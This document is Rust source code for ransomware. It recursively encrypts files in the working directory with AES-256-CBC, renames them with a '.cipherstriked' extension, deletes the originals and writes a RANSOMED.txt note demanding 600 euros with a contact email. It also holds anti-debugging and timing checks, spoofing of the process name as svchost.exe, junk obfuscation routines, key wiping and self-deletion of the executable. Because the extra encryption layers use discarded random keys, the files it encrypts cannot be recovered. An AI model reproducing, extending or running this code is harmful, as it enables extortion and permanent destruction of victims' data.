extern crate openssl;
extern crate rand;
extern crate walkdir;

use openssl::symm::{Cipher, Crypter, Mode};
use rand::{Rng, RngCore};
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::Path;
use walkdir::WalkDir;
use std::time::{SystemTime, UNIX_EPOCH, Duration};
use std::ptr;
use std::thread;
use std::arch::asm;

const BLOCK_SIZE: usize = 16;
const KEY_SIZE: usize = 32;
const PROTECTED_DIRS: [&str; 6] = [
    r"C:\Windows",
    r"C:\Program Files",
    r"C:\Program Files (x86)",
    r"C:\Users",
    r"C:\System32",
    r"C:\Temp",
];

const ransom_msg: &str = "\
Your files have been encrypted.\n\
send 600 euros to this wallet: \n\
send proof: noctol@aol.com\n\
permanant file loss occurs after a month.\n\
identifier: 8817728h";

fn crypter_idk(data: &mut [u8], key: &[u8], iv: &[u8], encrypt: bool) -> Vec<u8> {
    let cipher = Cipher::aes_256_cbc();
    let mode = if encrypt { Mode::Encrypt } else { Mode::Decrypt };
    let mut crypter = Crypter::new(cipher, mode, key, Some(iv)).unwrap();
    let mut output = vec![0; data.len() + BLOCK_SIZE];
    let mut count = crypter.update(data, &mut output).unwrap();
    count += crypter.finalize(&mut output[count..]).unwrap();
    output.truncate(count);
    output
}

fn detect_timing() -> bool {
    let start: u64;
    unsafe {
        asm!(
            "rdtsc",
            lateout("rax") start,
            out("rdx") _,
        );
    }
    let mut dummy: u64 = 0;
    let noise = rand::thread_rng().gen_range(5000..15000);
    for _ in 0..noise { dummy ^= dummy.wrapping_add(rand::random::<u64>()); }
    let end: u64;
    unsafe {
        asm!(
            "rdtsc",
            lateout("rax") end,
            out("rdx") _,
        );
    }
    let elapsed = end.wrapping_sub(start);
    elapsed > 2_500_000 + (noise as u64 * 100)
}

#[cfg(target_os = "windows")]
fn is_debugger_present() -> bool {
    unsafe {
        let mut result: i32 = 0;
        asm!(
            "mov eax, fs:[0x30]", 
            "movzx eax, byte ptr [eax + 0x2]", 
            lateout("eax") result,
        );
        result != 0
    }
}

#[cfg(not(target_os = "windows"))]
fn is_debugger_present() -> bool { false }

fn genkeyiv(mutation_seed: u64) -> (Vec<u8>, Vec<u8>) {
    let mut rng = rand::thread_rng();
    let mut key: Vec<u8> = (0..KEY_SIZE).map(|_| rng.gen()).collect();
    let mut iv: Vec<u8> = (0..BLOCK_SIZE).map(|_| rng.gen()).collect();
    let time_seed = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos() as u64 ^ mutation_seed;
    let seed_key = time_seed.to_le_bytes().repeat(4)[..KEY_SIZE].to_vec();
    let seed_iv = time_seed.to_be_bytes().repeat(2)[..BLOCK_SIZE].to_vec();
    key = crypter_idk(&mut key, &seed_key, &seed_iv, true);
    iv = crypter_idk(&mut iv, &seed_key, &seed_iv, true);
    (key, iv)
}

fn is_protected(path: &Path) -> bool {
    let path_str = path.to_str().unwrap_or_default();
    let mut hash: u32 = 0xCAFEBABE;
    for c in path_str.bytes() { hash = hash.wrapping_mul(41).wrapping_add(c as u32); }
    PROTECTED_DIRS.iter().any(|&dir| path_str.contains(dir) || (hash & 0xFF == 0x13))
}

fn data_encrypt(data: &[u8], key: &[u8], iv: &[u8], mutation_seed: u64) -> Vec<u8> {
    if detect_timing() || is_debugger_present() { std::process::exit(0xDEAD); }
    let cipher = Cipher::aes_256_cbc();
    let mut crypter = Crypter::new(cipher, Mode::Encrypt, key, Some(iv)).unwrap();
    let mut encrypted = vec![0; data.len() + BLOCK_SIZE];
    let mut count = crypter.update(data, &mut encrypted).unwrap();
    count += crypter.finalize(&mut encrypted[count..]).unwrap();
    let mut temp = encrypted[..count].to_vec();
    let time_key = (mutation_seed.wrapping_add(SystemTime::now().elapsed().unwrap().as_secs())).to_le_bytes().repeat(4)[..KEY_SIZE].to_vec();
    let time_iv = (mutation_seed ^ SystemTime::now().elapsed().unwrap().as_nanos() as u64).to_be_bytes().repeat(2)[..BLOCK_SIZE].to_vec();
    let mut obfuscated = crypter_idk(&mut temp, &time_key, &time_iv, true);
    let mut rng = rand::thread_rng();
    for i in 0..obfuscated.len() { obfuscated[i] ^= rng.gen::<u8>(); }
    obfuscated
}

fn encrypt_file(input_path: &Path, output_path: &Path, key: &[u8], iv: &[u8], mutation_seed: u64) -> std::io::Result<()> {
    let mut input_file = File::open(input_path)?;
    let mut output_file = File::create(output_path)?;
    let mut buffer = Vec::new();
    input_file.read_to_end(&mut buffer)?;
    let tamper_key = rand::thread_rng().gen::<[u8; KEY_SIZE]>();
    let tamper_iv = rand::thread_rng().gen::<[u8; BLOCK_SIZE]>();
    buffer = crypter_idk(&mut buffer, &tamper_key, &tamper_iv, true);
    let encrypted_data = data_encrypt(&buffer, key, iv, mutation_seed);
    output_file.write_all(&encrypted_data)?;
    fs::remove_file(input_path)?;
    Ok(())
}

fn dir_encryption(path: &Path, key: &[u8], iv: &[u8], mutation_seed: u64) -> std::io::Result<()> {
    let mut dummy = Vec::with_capacity(2048);
    dummy.resize(1024, 0xAB);
    for entry in WalkDir::new(path).into_iter().filter_map(Result::ok) {
        if is_debugger_present() { std::process::exit(0xBEEF); }
        let entry_path = entry.path();
        if entry_path.is_file() && !is_protected(entry_path) {
            let encrypted_filename = format!("{}.cipherstriked", entry_path.display());
            let output_path = Path::new(&encrypted_filename);
            let rand_val = rand::thread_rng().gen::<u8>();
            let mut temp = [rand_val; 16];
            let dummy_key = [rand_val; KEY_SIZE];
            let dummy_iv = [rand_val.wrapping_add(0x10); BLOCK_SIZE];
            let _encrypted_dummy = crypter_idk(&mut temp, &dummy_key, &dummy_iv, true);
            match rand_val % 4 {
                0 => unsafe { ptr::write_volatile(&mut dummy[0], rand_val); },
                1 => dummy.push(rand_val.wrapping_mul(0x07)),
                2 => dummy.rotate_right((rand_val & 0x1F) as usize),
                _ => dummy.resize(dummy.len() + (rand_val & 0xF) as usize, rand_val),
            }
            encrypt_file(entry_path, output_path, key, iv, mutation_seed)?;
            thread::sleep(Duration::from_millis(rand::thread_rng().gen_range(10..100)));
        }
    }
    dummy.clear();
    Ok(())
}

fn suicide() -> std::io::Result<()> {
    let exe_path = std::env::current_exe()?;
    let mut file = File::create(&exe_path)?;
    let junk_size = rand::thread_rng().gen_range(1024..4096);
    let junk = vec![0xFF; junk_size];
    file.write_all(&junk)?;
    file.set_len(junk_size as u64)?;
    drop(file);
    let _ = fs::remove_file(&exe_path);
    unsafe {
        asm!("int 3"); 
    }
    Ok(())
}

fn mutation_of_flow(mutation_seed: u64) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let mut junk_code: Vec<u8> = (0..rng.gen_range(50..200)).map(|_| rng.gen()).collect();
    let key = mutation_seed.to_le_bytes().repeat(4)[..KEY_SIZE].to_vec();
    let iv = (mutation_seed.wrapping_mul(0x1337)).to_be_bytes().repeat(2)[..BLOCK_SIZE].to_vec();
    let mut encrypted = crypter_idk(&mut junk_code, &key, &iv, true);
    encrypted.extend(vec![0x90; rng.gen_range(10..50)]);
    encrypted
}

fn control_flow_fuck(depth: u8) {
    let mut rng = rand::thread_rng();
    let val = rng.gen::<u8>();
    let mut branch_data = [val; 16];
    let branch_key = [val.wrapping_add(depth); KEY_SIZE];
    let branch_iv = [val.wrapping_sub(depth); BLOCK_SIZE];
    let _encrypted_branch = crypter_idk(&mut branch_data, &branch_key, &branch_iv, true);
    if val.wrapping_add(depth) > 0x90 {
        if val % 3 == 0 { control_flow_fuck(depth + 1); }
        else { unsafe { asm!("ud2"); } }
    } else if val.wrapping_sub(depth) < 0x30 {
        let _dummy = vec![val; (val & 0x1F) as usize];
    }
}

fn stack_obfuscation() {
    let mut junk = vec![0; 2048];
    rand::thread_rng().fill_bytes(&mut junk);
    let junk_key = rand::thread_rng().gen::<[u8; KEY_SIZE]>();
    let junk_iv = rand::thread_rng().gen::<[u8; BLOCK_SIZE]>();
    junk = crypter_idk(&mut junk, &junk_key, &junk_iv, true);
    unsafe {
        let ptr = junk.as_mut_ptr();
        ptr::write_bytes(ptr, 0xCC, 2048); 
    }
}

fn dynamic_addr_resolv() {
    let time = SystemTime::now().elapsed().unwrap().as_nanos();
    let mut dummy_data = time.to_le_bytes().to_vec();
    let ptr_key = time.to_be_bytes().repeat(4)[..KEY_SIZE].to_vec();
    let ptr_iv = time.to_le_bytes().repeat(2)[..BLOCK_SIZE].to_vec();
    let _encrypted_ptr = crypter_idk(&mut dummy_data, &ptr_key, &ptr_iv, true);
}

fn check_environment() -> bool {
    let suspicious = std::env::var("DEBUG").is_ok() || detect_timing() || is_debugger_present();
    if suspicious {
        unsafe {
            asm!(
                "mov rax, 0",
                "div rax",
            );
        }
    }
    suspicious
}

#[cfg(all(target_os = "windows", target_env = "msvc"))]
fn spoof_process_name() {
    use windows_sys::Win32::System::Threading::GetCurrentProcess;
    use windows_sys::Win32::System::Diagnostics::Debug::SetProcessDEPPolicy;
    unsafe {
        let fake_name = std::ffi::CString::new("svchost.exe").unwrap();
        let proc = GetCurrentProcess();
        SetProcessDEPPolicy(0);
        ptr::write_bytes(proc as *mut u8, fake_name.as_ptr() as u8, 12);
    }
}

#[cfg(not(all(target_os = "windows", target_env = "msvc")))]
fn spoof_process_name() {}

fn ransom_note(path: &Path) -> std::io::Result<()> {
    let ransom_path = path.join("RANSOMED.txt");
    let mut file = File::create(ransom_path)?;
    file.write_all(ransom_msg.as_bytes())?;
    Ok(())
}

fn main() -> std::io::Result<()> {
    spoof_process_name();
    if check_environment() { std::process::exit(0xBEEF); }
    let mutation_seed = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos() as u64;
    control_flow_fuck(0);
    let (mut key, mut iv) = genkeyiv(mutation_seed);
    stack_obfuscation();
    dynamic_addr_resolv();
    let _mutated = mutation_of_flow(mutation_seed);
    let path = Path::new("./");
    dir_encryption(path, &key, &iv, mutation_seed)?;
    ransom_note(path)?;
    let zero_key = [0xFF; KEY_SIZE];
    let zero_iv = [0xAA; BLOCK_SIZE];
    for _ in 0..3 {
        key = crypter_idk(&mut key, &zero_key, &zero_iv, true);
        iv = crypter_idk(&mut iv, &zero_key, &zero_iv, true);
        key.fill(0);
        iv.fill(0);
    }
    suicide()?;
    Ok(())
} // this edit includes the ransomnote
